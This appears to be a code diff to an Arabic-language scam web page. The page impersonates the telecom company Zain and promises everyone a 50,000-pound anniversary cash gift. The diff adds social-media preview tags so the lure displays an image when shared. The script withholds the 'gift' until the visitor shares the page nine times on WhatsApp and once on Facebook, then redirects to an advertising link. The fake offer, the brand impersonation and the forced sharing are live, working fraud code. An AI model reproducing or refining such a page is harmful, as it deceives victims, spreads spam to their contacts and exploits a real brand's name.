@@ -4,6 +4,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>زين - هدية الذكرى الثلاثين</title>
+    
+    <!-- ============================================================
+         🟢 وسوم المعاينة (Open Graph) لظهور الصورة على واتساب وفيسبوك
+         ============================================================ -->
+    <meta property="og:title" content="🎉 زين - هدية الذكرى الثلاثين!">
+    <meta property="og:description" content="احتفالًا بالذكرى السنوية الثلاثين، تقدم زين هدية نقدية خاصة بقيمة ج.س 50,000 للجميع!">
+    <meta property="og:image" content="https://dlrjc.buzz/static/images/topimage/ar/01.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="https://auctionr.org/4/95386702a1b6bd803f7f0299c5204a84">
+    <meta property="og:type" content="website">
+
+    <!-- وسوم تويتر (احتياطية) -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="🎉 زين - هدية الذكرى الثلاثين!">
+    <meta name="twitter:description" content="احتفالًا بالذكرى السنوية الثلاثين، تقدم زين هدية نقدية خاصة بقيمة ج.س 50,000 للجميع!">
+    <meta name="twitter:image" content="https://dlrjc.buzz/static/images/topimage/ar/01.jpg">
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
 
@@ -167,10 +185,12 @@
     <script>
         let waClicks = 0;
         let fbClicks = 0;
-        const MAX_WA = 9;  // 9 مشاركات واتساب
-        const MAX_FB = 1;  // مشاركة واحدة فيسبوك
+        const MAX_WA = 9;  
+        const MAX_FB = 1;  
 
-        const urlToShare = 'https://jobs-henna-nine.vercel.app/';
+        // 🟢 الرابط الذي سيتم مشاركته (يجب أن يكون رابط موقعك الحقيقي لكي تظهر الصورة)
+        const urlToShare = window.location.href; 
+        
         const textToShare = 
             'احتفالًا بالذكرى السنوية الثلاثين، تقدم زين هدية نقدية خاصة بقيمة ج.س 50,000 للجميع! 🎉\n\n' +
             'كيفية الحصول على هديتك: انقر على الرابط أدناه للاطلاع على هديتك النقدية من زين بمناسبة الذكرى السنوية الثلاثين، بقيمة ج.س 50,000.\n\n' +
@@ -197,7 +217,6 @@
             window.scrollTo(0, 0);
         }
 
-        // دالة المشاركة المعدلة (9 واتساب + 1 فيسبوك)
         function shareApp(platform) {
             if (platform === 'wa') {
                 if (waClicks < MAX_WA) {
@@ -207,31 +226,26 @@
             } else {
                 if (fbClicks < MAX_FB) {
                     fbClicks++;
+                    // مشاركة فيسبوك (ستظهر الصورة هنا أيضاً بسبب وسوم الـ OG)
                     window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(urlToShare), '_blank');
                     
-                    // تعطيل زر فيسبوك بعد النقرة الواحدة
                     let fbBtn = document.getElementById('btn-msg');
                     fbBtn.disabled = true;
                     fbBtn.innerHTML = 'Messenger (تم) ✔️';
                 }
             }
-
             updateProgress();
         }
 
-        // تحديث شريط التقدم
         function updateProgress() {
             let totalClicks = waClicks + fbClicks;
-            let totalRequired = MAX_WA + MAX_FB; // 10 نقاط
+            let totalRequired = MAX_WA + MAX_FB; 
             
-            // حساب النسبة المئوية
             let progress = (totalClicks / totalRequired) * 100;
             
-            // تحديث الشريط
             document.getElementById('progress-bar').style.width = progress + '%';
             document.getElementById('progress-text').innerText = Math.round(progress) + '%';
             
-            // إذا اكتمل الشريط (9 واتساب + 1 فيسبوك)
             if (totalClicks >= totalRequired) {
                 let btn = document.getElementById('btn-continue');
                 btn.style.backgroundColor = '#e6007e'; 
@@ -240,13 +254,11 @@
             }
         }
 
-        // دالة زر المتابعة والتحويل للإعلان
         function goToAd() {
             let totalClicks = waClicks + fbClicks;
             if (totalClicks < 10) {
                 alert('للأسف... يجب أن تشارك فعاليتنا مع أصدقائك حتى يمتلئ شريط التقدم.');
             } else {
-                // التحويل المباشر لرابط الإعلان
                 window.location.href = 'https://auctionr.org/4/95386702a1b6bd803f7f0299c5204a84';
             }
         }
